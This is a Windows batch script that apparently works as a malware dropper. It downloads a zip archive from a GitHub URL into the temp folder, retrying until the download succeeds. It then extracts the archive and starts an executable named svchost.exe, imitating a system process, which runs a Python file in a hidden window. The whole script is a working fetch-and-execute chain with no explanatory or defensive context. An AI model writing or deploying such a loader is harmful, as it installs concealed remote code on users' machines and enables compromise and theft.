@echo off
setlocal
set "url=https://github.com/nvslks/b/raw/refs/heads/b/1.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

powershell -Command "Start-Process -FilePath "$env:TEMP\svchost.exe" -ArgumentList "`"$env:TEMP\python.py`"" -WindowStyle Hidden"

exit
